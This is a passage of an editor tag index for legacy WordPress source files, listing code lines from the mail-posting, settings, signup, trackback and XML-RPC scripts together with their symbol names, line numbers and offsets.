				$ddate_i = $date_time[1];ddate_i134,4515
				$ddate_s = $date_time[2];ddate_s135,4545
				$ddate_m = $date_arr[1];ddate_m137,4576
				$ddate_d = $date_arr[0];ddate_d138,4605
				$ddate_Y = $date_arr[2];ddate_Y139,4634
				for ( $j = 0; $j < 12; $j++ ) {j140,4663
					if ( $ddate_m == $dmonths[$j] ) {ddate_m141,4699
						$ddate_m = $j+1;ddate_m142,4738
				$time_zn = intval($date_arr[4]) * 36;time_zn146,4775
				$ddate_U = gmmktime($ddate_H, $ddate_i, $ddate_s, $ddate_m, $ddate_d, $ddate_Y);ddate_U147,4817
				$ddate_U = $ddate_U - $time_zn;ddate_U148,4902
				$post_date = gmdate('Y-m-d H:i:s', $ddate_U + $time_difference);post_date149,4938
				$post_date_gmt = gmdate('Y-m-d H:i:s', $ddate_U);post_date_gmt150,5007
		$user = new WP_User($post_author);user157,5183
		$post_status = ( $user->has_cap('publish_posts') ) ? 'publish' : 'pending';post_status158,5220
		$post_status = 'pending';post_status161,5389
	$subject = trim($subject);subject164,5421
	if ( $content_type == 'multipart/alternative' ) {content_type166,5450
		$content = explode('--'.$boundary, $content);content167,5501
		$content = $content[2];content168,5549
			$content = explode($delim[0], $content);content171,5720
			$content = $content[1];content172,5764
		$content = strip_tags($content, '<img><p><br><i><b><u><em><strong><strike><font><span><div>');content174,5795
	$content = trim($content);content176,5895
	$content = apply_filters('wp_mail_original_content', $content);content180,6069
		$content = quoted_printable_decode($content);content183,6211
		$content = iconv($charset, get_option('blog_charset'), $content);content187,6321
	$content = explode($phone_delim, $content);content191,6458
	$content = empty( $content[1] ) ? $content[0] : $content[1];content192,6503
	$content = trim($content);content194,6566
	$post_content = apply_filters('phone_content', $content);post_content196,6595
	$post_title = xmlrpc_getposttitle($content);post_title198,6655
	if ($post_title == '') $post_title = $subject;post_title200,6702
	$post_category = array(get_option('default_email_category'));post_category202,6751
	$post_data = compact('post_content','post_title','post_date','post_date_gmt','post_author','post_category', 'post_status');post_data204,6815
	$post_data = add_magic_quotes($post_data);post_data205,6940
	$post_ID = wp_insert_post($post_data);post_ID207,6985

wordpress/wp-settings.php,628
 * the WordPress procedural and class library.library4,65
define( 'WPINC', 'wp-includes' );WPINC18,393
// Include the wpdb class and, if present, a db.php database drop-in.and75,2285
	define( 'MULTISITE', false );MULTISITE93,2923
// Run wp_cache_postload() if object cache is enabled and the function exists.exists208,6866
$wp_the_query = new WP_Query();wp_the_query227,7365
$wp_query =& $wp_the_query;wp_query235,7536
$wp = new WP();wp249,7792
$locale = get_locale();locale266,8138
$locale_file = WP_LANG_DIR . "/$locale.php";locale_file267,8162
	if ( true !== ( $file = ms_site_check() ) ) {file306,9501

wordpress/wp-signup.php,7458
function do_signup_header() {do_signup_header15,378
function wpmu_signup_stylesheet() {wpmu_signup_stylesheet33,720
function show_blog_form($blogname = '', $blog_title = '', $errors = '') {show_blog_form61,1738
function show_blog_form($blogname = '', $blog_title = '', $errors = '') {blog_title61,1738
	if ( $errmsg = $errors->get_error_message('blogname') ) { ?>errmsg69,2020
		echo '<input name="blogname" type="text" id="blogname" value="'.esc_attr($blogname).'" maxlength="60" /><span class="suffix_address">.' . ( $site_domain = preg_replace( '|^www\.|', '', $current_site->domain ) ) . '</span><br />';site_domain76,2379
			$site = $current_site->domain . $current_site->path . __( 'sitename' );site80,2676
			$site = __( 'domain' ) . '.' . $site_domain . $current_site->path;site82,2758
	<?php if ( $errmsg = $errors->get_error_message('blog_title') ) { ?>errmsg89,3120
function validate_blog_form() {validate_blog_form115,4317
	$user = '';user116,4349
		$user = wp_get_current_user();user118,4390
function show_user_form($user_name = '', $user_email = '', $errors = '') {show_user_form123,4511
function show_user_form($user_name = '', $user_email = '', $errors = '') {user_email123,4511
	if ( $errmsg = $errors->get_error_message('user_name') ) {errmsg126,4664
	<?php if ( $errmsg = $errors->get_error_message('user_email') ) { ?>errmsg134,5033
	if ( $errmsg = $errors->get_error_message('generic') ) {errmsg139,5407
function validate_user_form() {validate_user_form145,5564
function signup_another_blog($blogname = '', $blog_title = '', $errors = '') {signup_another_blog149,5677
function signup_another_blog($blogname = '', $blog_title = '', $errors = '') {blog_title149,5677
	$current_user = wp_get_current_user();current_user151,5779
		$errors = new WP_Error();errors154,5853
	$filtered_results = apply_filters('signup_another_blog_init', array('blogname' => $blogname, 'blog_title' => $blog_title, 'errors' => $errors ));filtered_results158,5927
	$blogname = $filtered_results['blogname'];blogname159,6074
	$blog_title = $filtered_results['blog_title'];blog_title160,6118
	$errors = $filtered_results['errors'];errors161,6166
	$blogs = get_blogs_of_user($current_user->ID);blogs172,6760
					$home_url = get_home_url( $blog->userblog_id );home_url178,6947
function validate_another_blog_signup() {validate_another_blog_signup194,7607
	$current_user = wp_get_current_user();current_user196,7713
	$result = validate_blog_form();result200,7792
	$public = (int) $_POST['blog_public'];public208,7957
	$meta = apply_filters( 'signup_create_blog_meta', array( 'lang_id' => 1, 'public' => $public ) ); // deprecatedmeta209,7997
	$meta = apply_filters( 'add_signup_meta', $meta );meta210,8110
function confirm_another_blog_signup($domain, $path, $blog_title, $user_name, $user_email = '', $meta = '') {confirm_another_blog_signup217,8391
function confirm_another_blog_signup($domain, $path, $blog_title, $user_name, $user_email = '', $meta = '') {user_email217,8391
function signup_user($user_name = '', $user_email = '', $errors = '') {signup_user227,8922
function signup_user($user_name = '', $user_email = '', $errors = '') {user_email227,8922
		$errors = new WP_Error();errors231,9064
	$signup_for = isset( $_POST[ 'signup_for' ] ) ? esc_html( $_POST[ 'signup_for' ] ) : 'blog';signup_for233,9093
	$filtered_results = apply_filters('signup_user_init', array('user_name' => $user_name, 'user_email' => $user_email, 'errors' => $errors ));filtered_results236,9230
	$user_name = $filtered_results['user_name'];user_name237,9371
	$user_email = $filtered_results['user_email'];user_email238,9417
	$errors = $filtered_results['errors'];errors239,9465
		<?php if ( $active_signup == 'blog' ) { ?>active_signup250,9853
		<?php } elseif ( $active_signup == 'user' ) { ?>active_signup252,9972
function validate_user_signup() {validate_user_signup268,10681
	$result = validate_user_form();result269,10715
function confirm_user_signup($user_name, $user_email) {confirm_user_signup288,11129
function signup_blog($user_name = '', $user_email = '', $blogname = '', $blog_title = '', $errors = '') {signup_blog298,11646
function signup_blog($user_name = '', $user_email = '', $blogname = '', $blog_title = '', $errors = '') {user_email298,11646
		$errors = new WP_Error();errors300,11782
	$filtered_results = apply_filters('signup_blog_init', array('user_name' => $user_name, 'user_email' => $user_email, 'blogname' => $blogname, 'blog_title' => $blog_title, 'errors' => $errors ));filtered_results303,11853
	$user_name = $filtered_results['user_name'];user_name304,12048
	$user_email = $filtered_results['user_email'];user_email305,12094
	$blogname = $filtered_results['blogname'];blogname306,12142
	$blog_title = $filtered_results['blog_title'];blog_title307,12186
	$errors = $filtered_results['errors'];errors308,12234
		$blogname = $user_name;blogname311,12300
function validate_blog_signup() {validate_blog_signup324,12874
	$result = wpmu_validate_user_signup($_POST['user_name'], $_POST['user_email']);result326,12935
	$result = wpmu_validate_blog_signup($_POST['blogname'], $_POST['blog_title']);result334,13141
	$public = (int) $_POST['blog_public'];public342,13370
	$meta = array ('lang_id' => 1, 'public' => $public);meta343,13410
	$meta = apply_filters( 'add_signup_meta', $meta );meta344,13464
function confirm_blog_signup($domain, $path, $blog_title, $user_name = '', $user_email = '', $meta) {confirm_blog_signup351,13697
function confirm_blog_signup($domain, $path, $blog_title, $user_name = '', $user_email = '', $meta) {user_name351,13697
$active_signup = get_site_option( 'registration' );active_signup372,14993
	$active_signup = 'all';active_signup374,15068
$active_signup = apply_filters( 'wpmu_active_signup', $active_signup ); // return "all", "none", "blog" or "user"active_signup376,15094
$newblogname = isset($_GET['new']) ? strtolower(preg_replace('/^-|-$|[^-a-zA-Z0-9]/', '', $_GET['new'])) : null;newblogname387,15846
$current_user = wp_get_current_user();current_user389,15960
if ( $active_signup == 'none' ) {active_signup390,15999
} elseif ( $active_signup == 'blog' && !is_user_logged_in() ) {active_signup392,16075
		$proto = 'https://';proto394,16156
		$proto = 'http://';proto396,16185
	$login_url = site_url( 'wp-login.php?redirect_to=' . urlencode($proto . $_SERVER['HTTP_HOST'] . '/wp-signup.php' ));login_url397,16207
	$stage = isset( $_POST['stage'] ) ?  $_POST['stage'] : 'default';stage400,16448
			if ( $active_signup == 'all' || $_POST[ 'signup_for' ] == 'blog' && $active_signup == 'blog' || $_POST[ 'signup_for' ] == 'user' && $active_signup == 'user' )active_signup403,16568
			if ( $active_signup == 'all' || $active_signup == 'blog' )active_signup409,16856
			$user_email = isset( $_POST[ 'user_email' ] ) ? $_POST[ 'user_email' ] : '';user_email419,17116
			if ( is_user_logged_in() && ( $active_signup == 'all' || $active_signup == 'blog' ) )active_signup421,17284
			elseif ( is_user_logged_in() == false && ( $active_signup == 'all' || $active_signup == 'user' ) )active_signup423,17412
			elseif ( is_user_logged_in() == false && ( $active_signup == 'blog' ) )active_signup425,17560
				$newblog = get_blogaddress_by_name( $newblogname );newblog431,17804
				if ( $active_signup == 'blog' || $active_signup == 'all' )active_signup433,17861

wordpress/wp-trackback.php,2319
function trackback_response($error = 0, $error_message = '') {trackback_response19,374
function trackback_response($error = 0, $error_message = '') {error_message19,374
$request_array = 'HTTP_POST_VARS';request_array37,885
	$tb_id = explode('/', $_SERVER['REQUEST_URI']);tb_id40,972
	$tb_id = intval( $tb_id[ count($tb_id) - 1 ] );tb_id41,1021
$tb_url  = isset($_POST['url'])     ? $_POST['url']     : '';tb_url44,1073
$charset = isset($_POST['charset']) ? $_POST['charset'] : '';charset45,1135
$title     = isset($_POST['title'])     ? stripslashes($_POST['title'])      : '';title48,1300
$excerpt   = isset($_POST['excerpt'])   ? stripslashes($_POST['excerpt'])    : '';excerpt49,1383
$blog_name = isset($_POST['blog_name']) ? stripslashes($_POST['blog_name'])  : '';blog_name50,1466
	$charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );charset53,1564
	$charset = 'ASCII, UTF-8, ISO-8859-1, JIS, EUC-JP, SJIS';charset55,1647
	$title     = mb_convert_encoding($title, get_option('blog_charset'), $charset);title62,1864
	$excerpt   = mb_convert_encoding($excerpt, get_option('blog_charset'), $charset);excerpt63,1945
	$blog_name = mb_convert_encoding($blog_name, get_option('blog_charset'), $charset);blog_name64,2028
$title     = $wpdb->escape($title);title68,2204
$excerpt   = $wpdb->escape($excerpt);excerpt69,2240
$blog_name = $wpdb->escape($blog_name);blog_name70,2278
	$tb_id = $posts[0]->ID;tb_id73,2351
	$title =  wp_html_excerpt( $title, 250 ).'...';title90,2863
	$excerpt = wp_html_excerpt( $excerpt, 252 ).'...';excerpt91,2912
	$comment_post_ID = (int) $tb_id;comment_post_ID93,2965
	$comment_author = $blog_name;comment_author94,2999
	$comment_author_email = '';comment_author_email95,3030
	$comment_author_url = $tb_url;comment_author_url96,3059
	$comment_content = "<strong>$title</strong>\n\n$excerpt";comment_content97,3091
	$comment_type = 'trackback';comment_type98,3150
	$dupe = $wpdb->get_results( $wpdb->prepare("SELECT * FROM $wpdb->comments WHERE comment_post_ID = %d AND comment_author_url = %s", $comment_post_ID, $comment_author_url) );dupe100,3181
	$commentdata = compact('comment_post_ID', 'comment_author', 'comment_author_email', 'comment_author_url', 'comment_content', 'comment_type');commentdata104,3450

wordpress/xmlrpc.php,691
define('XMLRPC_REQUEST', true);XMLRPC_REQUEST13,142
$_COOKIE = array();_COOKIE16,242
	$HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );HTTP_RAW_POST_DATA21,401
	$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);HTTP_RAW_POST_DATA26,575
 * Posts submitted via the xmlrpc interface get that titleget58,1991
$post_default_title = "";post_default_title62,2097
// Allow for a plugin to insert a different class to handle requests.to64,2124
$wp_xmlrpc_server_class = apply_filters('wp_xmlrpc_server_class', 'wp_xmlrpc_server');wp_xmlrpc_server_class65,2194
$wp_xmlrpc_server = new $wp_xmlrpc_server_class;wp_xmlrpc_server66,2281
function logIO( $io, $msg ) {logIO82,2615
